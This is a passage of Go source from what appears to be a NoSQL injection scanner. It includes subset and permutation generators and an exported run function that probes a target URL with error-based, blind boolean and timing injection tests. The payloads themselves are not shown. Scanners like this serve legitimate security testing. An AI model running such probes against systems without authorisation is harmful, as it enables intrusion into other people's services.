		iData[i] = v
	}
	go func(c chan []string) {
		defer close(c)

		for combo := range Combinations(iData...) {
			sData := make([]string, len(combo))
			for i, v := range combo {
				sData[i] = v.(string)
			}
			c <- sData
		}
	}(c)

	return c
}
func BodyItemCombinations(data []BodyItem) <-chan []BodyItem {
	c := make(chan []BodyItem)
	iData := make([]interface{}, len(data))
	for i, v := range data {
		iData[i] = v
	}
	go func(c chan []BodyItem) {
		defer close(c)

		for combo := range Combinations(iData...) {
			sData := make([]BodyItem, len(combo))
			for i, v := range combo {
				sData[i] = v.(BodyItem)
			}
			c <- sData
		}
	}(c)

	return c
}
func Combinations(data ...interface{}) <-chan []interface{} {
	c := make(chan []interface{})
	go func(c chan []interface{}) {
		defer close(c)

		combinationsGenerator(c, data)
	}(c)

	return c
}
func combinationsGenerator(c chan []interface{}, set []interface{}) {
	length := uint(len(set))

	// Go through all possible combinations of objects
	// from 0 (empty object in subset) to 2^length (all objects in subset)
	for subsetBits := 1; subsetBits < (1 << length); subsetBits++ {
		var subset []interface{}

		for object := uint(0); object < length; object++ {
			// checks if object is contained in subset
			// by checking if bit 'object' is set in subsetBits
			if (subsetBits>>object)&1 == 1 {
				// add object to subset
				subset = append(subset, set[object])
			}
		}
		c <- subset
	}
}
func Permutations(data []string) <-chan []string {
	c := make(chan []string)

	go func(c chan []string) {
		defer close(c)

		var permutations []string
		generatePermutations(c, permutations, data)
	}(c)

	return c
}
func generatePermutations(c chan []string, permutations []string, universe []string) {
	if len(universe) <= 0 {
		return
	}

	var permutation []string
	for i, str := range universe {
		permutation = append(permutation, str)
		c <- permutation
		newUniverse := append([]string(nil), universe[:i]...) //ensure we copy the slice, and don't just point to the underlying array
		newUniverse = append(newUniverse, universe[i+1:]...)

		generatePermutations(c, permutation, newUniverse)
	}
}

// main
func display(injectables []InjectionObject) string {
	var report strings.Builder

	for _, in := range injectables {
		report.WriteString(in.String())
	}

	if len(injectables) == 0 {
		report.WriteString("No injections found.\n")
	}

	return report.String()
}

//export run
func run(urlPtr *C.char, requestDataPtr *C.char) *C.char {
	target := C.GoString(urlPtr)
	requestData := C.GoString(requestDataPtr)

	var report strings.Builder
	report.WriteString(fmt.Sprintf("URL: %s\n", target))

	requireHTTPS := false
	userAgent := "Mozilla/5.0 (compatible; NoSQLi-Scanner/1.0)"
	request := ""
	allowInsecureCertificates := false
	proxy := ""

	var scanOptions = ScanOptions{target, request, proxy, userAgent, requestData, requireHTTPS, allowInsecureCertificates}
	attackObj, err := NewAttackObject(scanOptions)
	if err != nil {
		return C.CString(fmt.Sprintf("Error: %v\n", err))
	}

	attackObj.Request.Method = "POST"

	var injectables []InjectionObject
	injectables = append(injectables, ErrorBasedInjectionTest(attackObj)...)
	injectables = append(injectables, BlindBooleanInjectionTest(attackObj)...)
	injectables = append(injectables, TimingInjectionTest(attackObj)...)

	report.WriteString(display(injectables))

	return C.CString(report.String())
}

func main() {}
